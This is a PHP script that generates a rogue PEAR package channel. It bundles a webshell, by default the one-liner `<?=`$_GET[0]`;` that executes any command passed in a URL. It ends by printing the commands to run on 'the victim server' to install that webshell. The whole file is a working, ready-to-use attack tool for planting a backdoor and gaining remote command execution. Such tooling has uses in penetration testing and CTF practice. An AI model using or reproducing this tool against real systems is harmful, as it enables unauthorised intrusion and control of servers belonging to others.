#!/usr/bin/env php
<?php

function rmdir_rec($dir) {
    $files = array_diff(scandir($dir), array(".", ".."));
    foreach ($files as $file) {
        if (is_dir("$dir/$file")) {
            rmdir_rec("$dir/$file");
        } else {
            unlink("$dir/$file");
        }
    }
    return rmdir($dir);
}

/* Your web server's hostname is required */
while (true) {
    $hostname = trim(readline("Your web server's hostname > "));
    if ($hostname !== "") {
        break;
    }
    file_put_contents("php://stderr", "Hostname cannot be empty" . PHP_EOL);
}

/* http or https */
while (true) {
    $protocol = trim(readline("Use https? (y/n) [y] > "));
    if (strlen($protocol) === 0 || (strlen($protocol) === 1)) {
        if (strlen($protocol) === 0 || $protocol === "y") {
            $protocol = "https";
            break;
        } else if ($protocol === "n") {
            $protocol = "http";
            break;
        }
    }
}

/* Webshell's file name */
$webshell_name = trim(readline("Webshell file name? [shell.php] > "));
if ($webshell_name === "") {
    $webshell_name = "shell.php";
} else {
    $webshell_name = basename($webshell_name);
}

/* Webshell PHP code */
while (true) {
    $from_file_stdin = trim(readline("Read PHP webshell code from file or from stdin? (file/stdin) [stdin] > "));
    if ($from_file_stdin === "file") {
        while (true) {
            $file = trim(readline("Filename? > "));
            if ($file !== "") {
                if (file_exists($file) && is_readable($file)) {
                    $webshell_code = file_get_contents($file);
                    break;
                } else {
                    file_put_contents("php://stderr", "$file does not exist or $file is unreadable." . PHP_EOL);
                }
            }
        }
        break;
    } else if ($from_file_stdin === "" || $from_file_stdin === "stdin") {
        $webshell_code = readline("Code? [\"<?=`\$_GET[0]`;\"] > ");
        if ($webshell_code === "") {
            $webshell_code = "<?=`\$_GET[0]`;";
        }
        break;
    }
}

/* The PEAR package name, version, etc */
$package_name = trim(readline("PEAR package name? [Shell] > "));
if ($package_name === "") {
    $package_name = "Shell";
}
$package_version = trim(readline("Version? [1.0.0] > "));
if ($package_version === "") {
    $package_version = "1.0.0";
}
$package_release = trim(readline("Release? [stable] > "));
if ($package_release === "") {
    $package_release = "stable";
}

/* The channel's name alias */
$channel_alias = trim(readline("Channel name alias? [rogue] > "));
if ($channel_alias === "") {
    $channel_alias = "rogue";
}

$doc_root = "public_html";
$package_name_lower = strtolower($package_name);
$get_dir = "get";
$rest_p = "rest/p/$package_name_lower";
$rest_r = "rest/r/$package_name_lower";
$server_url = "$protocol://$hostname";
$rest_url = "$server_url/rest/";
$package_dir = "$package_name-$package_version";
$tarball = "$package_name.tar";
$tarball_url = "$server_url/get/$package_name";

/* Clean old public_html and create a new one */
chdir(__DIR__);
if (file_exists($doc_root)) {
    rmdir_rec($doc_root);
}
mkdir($doc_root);
mkdir("$doc_root/$get_dir", 0755, true);
mkdir("$doc_root/$rest_p", 0755, true);
mkdir("$doc_root/$rest_r", 0755, true);

/* channel.xml */
$channel_xml_file = "$doc_root/channel.xml";
$channel_xml_data = <<<EOF
<?xml version="1.0" encoding="UTF-8" ?>
<channel version="1.0" xmlns="http://pear.php.net/channel-1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://pear.php.net/dtd/channel-1.0 http://pear.php.net/dtd/channel-1.0.xsd">
    <name>$hostname</name>
    <summary>shell</summary>
    <suggestedalias>$channel_alias</suggestedalias>
    <servers>
        <primary>
            <rest>
                <baseurl type="REST1.0">$rest_url</baseurl>
                <baseurl type="REST1.1">$rest_url</baseurl>
            </rest>
        </primary>
    </servers>
</channel>
EOF;
file_put_contents($channel_xml_file, $channel_xml_data);

/* allreleases.xml */
$allreleases_xml_file = "$doc_root/$rest_r/allreleases.xml";
$allreleases_xml_data = <<<EOF
<?xml version="1.0" encoding="UTF-8" ?>
<a xmlns="http://pear.php.net/dtd/rest.allreleases" xsi:schemaLocation="http://pear.php.net/dtd/rest.allreleases http://pear.php.net/dtd/rest.allreleases.xsd">
    <p>$package_name</p>
    <c>$hostname</c>
    <r>
        <v>$package_version</v>
        <s>$package_release</s>
    </r>
</a>
EOF;
file_put_contents($allreleases_xml_file, $allreleases_xml_data);

/* deps.VERSION.txt */
$deps_file = "$doc_root/$rest_r/deps.$package_version.txt";
$deps_data = serialize(array(
    "required" => array(
        "php" => array(
            "min" => "5.1.0"
        ),
        "pearinstaller" => array(
            "min" => "1.4.1"
        )
    )
));
file_put_contents($deps_file, $deps_data);

/* version.xml */
$version_xml_file = "$doc_root/$rest_r/$package_version.xml";
$version_xml_data = <<<EOF
<?xml version="1.0" encoding="iso-8859-1" ?>
<r xmlns="http://pear.php.net/dtd/rest.release" xsi:schemaLocation="http://pear.php.net/dtd/rest.release http://pear.php.net/dtd/rest.release.xsd">
    <p xlink:href="/$rest_p">$package_name</p>
    <c>$hostname</c>
    <v>$package_version</v>
    <st>$package_release</st>
    <l>GPLv3</l>
    <m>wxrdnx</m>
    <s>shell</s>
    <d>shell</d>
    <da>2020-04-01</da>
    <n>shell</n>
    <f>31337</f>
    <g>$tarball_url</g>
    <x xlink:href="package.$package_version.xml"/>
</r>
EOF;
file_put_contents($version_xml_file, $version_xml_data);

/* info.xml */
$info_xml_file = "$doc_root/$rest_p/info.xml";
$info_xml_data = <<<EOF
<?xml version="1.0" encoding="UTF-8" ?>
<p xmlns="http://pear.php.net/dtd/rest.package" xsi:schemaLocation="http://pear.php.net/dtd/rest.package http://pear.php.net/dtd/rest.package.xsd">
    <n>$package_name</n>
    <c>$hostname</c>
    <l>GPLv3</l>
    <s>shell</s>
    <d>shell</d>
</p>
EOF;
file_put_contents($info_xml_file, $info_xml_data);

chdir("$doc_root/$get_dir");
mkdir($package_dir);

/* package.xml */
$package_xml_file = "package.xml";
$package_xml_data = <<<EOF
<?xml version="1.0" encoding="UTF-8"?>
<package packagerversion="1.10.12" version="2.0" xmlns="http://pear.php.net/dtd/package-2.0" xmlns:tasks="http://pear.php.net/dtd/tasks-1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://pear.php.net/dtd/tasks-1.0 http://pear.php.net/dtd/tasks-1.0.xsd http://pear.php.net/dtd/package-2.0 http://pear.php.net/dtd/package-2.0.xsd">
    <name>$package_name</name>
    <channel>$hostname</channel>
    <summary>shell</summary>
    <description>shell</description>
    <lead>
        <name>wxrdnx</name>
        <user>wxrdnx</user>
        <email></email>
        <active></active>
    </lead>
    <date>2020-04-01</date>
    <time>00:00:00</time>
    <version>
        <release>$package_version</release>
        <api>$package_version</api>
    </version>
    <stability>
        <release>$package_release</release>
        <api>$package_release</api>
    </stability>
    <license>GPLv3</license>
    <notes>shell</notes>
    <contents>
        <dir name="/">
            <file baseinstalldir="/" name="$webshell_name" role="php" />
        </dir>
    </contents>
    <compatible>
        <name>PEAR</name>
        <channel>pear.php.net</channel>
        <min>1.8.0</min>
        <max>1.10.10</max>
    </compatible>
    <dependencies>
        <required>
            <php>
                <min>5.2.0</min>
            </php>
            <pearinstaller>
                <min>1.9.0</min>
            </pearinstaller>
        </required>
    </dependencies>
    <phprelease />
</package>
EOF;
file_put_contents($package_xml_file, $package_xml_data);

/* PHP webshell file */
$webshell_php_file = "$package_dir/$webshell_name"; 
file_put_contents($webshell_php_file, $webshell_code);

/* Generate tarball */
try {
    $tar = new PharData($tarball);
    $tar->addFile($package_xml_file);
    $tar->addFile($webshell_php_file);
    $tar->compress(Phar::GZ, "tgz");
} catch (Exception $e) {
    echo "Exception : " . $e;
}

/* Clean up */
unlink($tarball);
unlink($package_xml_file);
unlink($webshell_php_file);
rmdir($package_dir);
chdir(__DIR__);

/* Done */
print(PHP_EOL);
print("\033[92mAll Done!\033[0m" . PHP_EOL);
print(PHP_EOL);
print("Now you should move all the files in `public_html' to the document root (like `/var/www/html/') of your web server." . PHP_EOL);
print("After that, try to execute the following PEAR commands on the victim server and download your webshell." . PHP_EOL);
print(PHP_EOL);
print("\033[1mpear channel-discover $hostname\033[0m" . PHP_EOL);
print("\033[1mpear install $channel_alias/$package_name\033[0m" . PHP_EOL);
?>
